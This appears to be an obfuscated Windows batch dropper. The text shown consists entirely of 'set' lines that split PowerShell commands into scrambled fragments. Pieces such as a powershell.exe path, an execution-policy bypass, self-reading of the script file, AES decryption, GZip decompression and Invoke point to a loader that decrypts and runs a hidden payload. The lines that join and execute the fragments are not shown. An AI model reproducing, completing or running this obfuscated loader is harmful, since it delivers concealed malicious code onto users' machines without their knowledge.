@echo off
set "xuSbTueKQR=ws"
set "IuBdqvcbaz=rS"
set "ExUBBbrECv=ow"
set "lZlfPZQTxR=Wi"
set "aGesJVgRWd=0\"
set "KTJIvWohGZ=Po"
set "qZstKmIdyB=.e"
set "UpKLJDmOQK=po"
set "QVcTUSggQL=in"
set "PjjAiqsGsa=\v"
set "kBJpfDDvxH=he"
set "NwpZaZEZQi=he"
set "DtjWEafnsN=py"
set "xIOzBVFGGC=s\"
set "ToHmeUUTKh=do"
set "akTfKFFVBp=we"
set "TnhhlEUUeK=1."
set "TnhGkColkN=\W"
set "HYGQotFgyC=we"
set "rgdudcZneq=ll"
set "RqbAShqKRD=32"
set "GMnKgnBMqo=ll"
set "sHHGnifQRn=rs"
set "jSMAXkiqES=y "
set "ImqbtYfUwl=em"
set "exhkKYiexW=Sy"
set "HTtXgxWHcX=nd"
set "oJdFTVcVTt=co"
set "RBcEtiDxzT=:\"
set "URMvCVqEbr= C"
set "ywXDAgorKK=xe"
set "lVuCoNfKEN=st"
set "PjJQlmDnCk= /"
set "bWQQqqvPwp= %~dp0"
set "UKDjTCTRvE=cd"
set "jsrZGcPuBw=IOXs"
set "ZIGvVnhXyd=.Len"
set "LBniizorqZ=.Cop"
set "qXzYHhxHni=Comp"
set "AZMPdkzFQC=, (,"
set "SnAgdQmvwx=ke($"
set "xGnqkrgbGA=gjYA"
set "GkDBZllTjj=..-1"
set "YxdSujVxGp=gsYZ"
set "kbEjgDSqPC= [Sy"
set "OORmYvvESA=Fina"
set "BSSYuZynjl=em.I"
set "QbRXRGZPeo=onve"
set "STVnGNKwtz=('%~f0'"
set "LPUFOgqwFz=ay()"
set "AAcIPhTxDo=I = "
set "TpLxCKDqJD=]::C"
set "WSryXcKdSX=1..-"
set "iiwZseXQHN== $P"
set "qbzqaRCbsy=; };"
set "NtUClZhEod=  $c"
set "fgcoumIBet=ing("
set "WWJHSrQsGh=HiGi"
set "xwOPSNaXsS=b, 0"
set "TuTUthmyIC=('Tg"
set "zbTNmUpdhK=le  "
set "qasLmmkPWi=join"
set "NUhPzTyfVn=;$Mh"
set "PwZVuaSUKm=GcsP"
set "SeHdQMXvzQ=PbR "
set "bNbxKSVLhg===')"
set "wgbsLViUAd=oL'["
set "VtoShoOWPn=6] -"
set "biHUHuBzaI=comm"
set "VDvEoStbLS=.Com"
set "mpEWFNlkAp=F'[-"
set "TVutUbtiMG=e = "
set "YTCfzSdgsW=$RGc"
set "HylqAKSvRi=n ''"
set "yTLnrGVRCq=ct S"
set "fYcvoRRaPZ= [Sy"
set "qmVgGJvnfK=oArr"
set "bYYVVCwyFn=] -j"
set "JfHCSnnMjK=)))"
set "MXgHnnUjrv= = $"
set "mjDbSXCgsB=sP ="
set "mPBFlFgjJA=);$o"
set "OjrSCGjump=eMVs"
set "oeUPaWoxfw=..-1"
set "GSgLYOomiq=kUSA"
set "CBjyfZRHlp=('da"
set "PDNDlKCcBt=$VgG"
set "beVwFmwYdU=);$R"
set "OyFlHkHgUG=s75K"
set "OpYzbNfzxl=CFxo"
set "kcYdzFddZI=ion."
set "omkLYWGoGV=oin "
set "YwkZBexWUJ=join"
set "BDtJQvlFqS=.Mem"
set "oXTIyDDoMF=New-"
set "QwZBJxJiwi=MKb."
set "VKKTYvZuQV=eam("
set "GjUbSulmto=am;$"
set "LURbosvWqC=rity"
set "tAEbNsQMNQ=sion"
set "HUPyUcQarP=)($H"
set "RtvmqZJIZP=GTe "
set "YXGHmnKKEA=and "
set "qPSKAABdTY=$oVe"
set "UaUrnfbTfB= '')"
set "XrhFzPmQhY=$PVl"
set "EqYLOQvXtn=urit"
set "YPUXQbzYWv=ct S"
set "BiWtxyahMA=O.Me"
set "wASnIFKjIm=Star"
set "GnBsCqLewm=y.Cr"
set "VSzaLaxxkQ=R.En"
set "dmXgRitAOu=hMKb"
set "VUhbHukxfE=b = "
set "dUQtyJkXAf= = ["
set "nfpBGumNAU=Vezs"
set "MhIWFMynZf=();$"
set "TGZFOHldji=m(, "
set "HZQqTqXFLh=stem"
set "yTboRYwpOD=ew-O"
set "MHFaELCtwM=sP);"
set "TsAUQKAPgI='[-1"
set "UzBYxtcaSv=Mode"
set "diZJxDYywB=-joi"
set "yuZvFrZJqD=rt]:"
set "DPbkkkdqEV=.Cry"
set "DbhXdMAykb= if "
set "niLZysINuB==');"
set "PpJCjXEgGY=ptog"
set "CukVjkriCa=OV.I"
set "JLIIQWAKCi='gni"
set "wwHTfkGTDn=mory"
set "kdoIbEaNNB=e]::"
set "mIJrSGiROc=m.Re"
set "RmrAtECpFu=zHhH"
set "yjIDmsuJVC=ypto"
set "VZMvmeQLIV=raph"
set "bgISDwUbBZ= = $"
set "VSCJAEvtSG=YxVw"
set "qQxhPvxNEN=;$ta"
set "qlmzYcMgHN=$RGc"
set "HIRdPYaHDQ=tem."
set "AAqQQTjbOJ='[-1"
set "EOMLDrjcyb=esaB"
set "YxZwUbWaPS=106u"
set "WrpHGbWuiD=pStr"
set "JVMrRhrelQ=ck($"
set "cZvcUoCYdw=Bmor"
set "yzuDxMiCXb=:('g"
set "qUCqNYWyIa=)) {"
set "rpRhgGfOYN=($Sg"
set "OSWQAaltgP=ose("
set "auyAVuIVqN=P) {"
set "Cbiuqsjgvh=form"
set "SPvAfrncrR=VlOV"
set "guMtXyFWQn=gth)"
set "eyEFGGdcLj=V.Pa"
set "epTIYSYPPo=tem."
set "uvPDIGEYzj='')("
set "DFYhkZeums=m.IO"
set "VXnNisgtIO=.Sec"
set "DqddOSaHpk=rans"
set "vDGmMgkGAM=sP.T"
set "uTmFgVPEWy=PTtG"
set "GKXFdPbGUg=;$Vg"
set "QgHeAqpFVC=1] -"
set "VzxeVwaeJx=VlOV"
set "KsCXxbkWvM=FI, "
set "FFygQOPndS=ach "
set "sLlciApaAz=$kUS"
set "QNaavzPOrk=yste"
set "LrYVUBVIAF=3); "
set "fAznYuSyBU=::De"
set "ZnBjeAqqJe=S46e"
set "kWNMgbelDb=($Sg"
set "KIjVoHmzat=nirt"
set "BPiDYIsAAo=VlOV"
set "EFhaSfyIRv=[Sys"
set "utpabWIOpy=-4] "
set "llpWOHjsWi=y.Pa"
set "QFyNrBthbK=dj0C"
set "nIhfstnsZM=.Dis"
set "VuAPzALAdX=[Sys"
set "pIxeVDsiOv=t Sy"
set "XXZogOzRet=HiGi"
set "CBOKUANpRW=m.IO"
set "CzlarYDDKL=v.Su"
set "DPzMOIrPhL=.Cre"
set "NvpXXedGHq=tion"
set "xplkgrGnAf=saBm"
set "RYnsFVVMel=PxEW"
set "XeMEAiWLRM=.GZi"
set "oGrclUWMLG=zuZI"
set "OCJEYGduKt=pres"
set "asRlxZNgJg=stem"
set "BOvxOZfraZ=iron"
set "TkWCPdlOfg=OEv "
set "kFNaDenkaJ=yste"
set "UATqhVUXqV=7;$P"
set "bgSzngQAqY=ZoNF"
set "ihnPuVwCEp= '')"
set "pvAtKxeffz=[Env"
set "qxsoYEvsRI=th('"
set "xYAZRKtfwH=grap"
set "xGbFQSMZIE=6esa"
set "FvpurWeasR=trea"
set "rOakbyAKOs=lBlo"
set "ZmcpQptPLd=-ep "
set "OljxloQlCQ=PKCS"
set "TrrPQhZxQo=brea"
set "daNNQSFqeU=Obje"
set "YINWoGiFzH=tem."
set "dqtcCuPMen=iGib"
set "GlaHFKdAdB=:: '"
set "gyuAUnsBCP=l5E7"
set "gVKIHOAwdN=se()"
set "XGHOIJwmdE=d;$P"
set "fGwIUgDQvf=ionM"
set "bLSPyDKOVQ=IOXs"
set "SlYggHNxIf=ecry"
set "rGEUOybCvy=('%*'"
set "aAkugERGiA=Conv"
set "imLrYyoYnY=ateD"
set "efupXgixnP=fore"
set "aDvBYXluAC=Invo"
set "iBXmZHLcYP=bstr"
set "DGliWZugUp=ress"
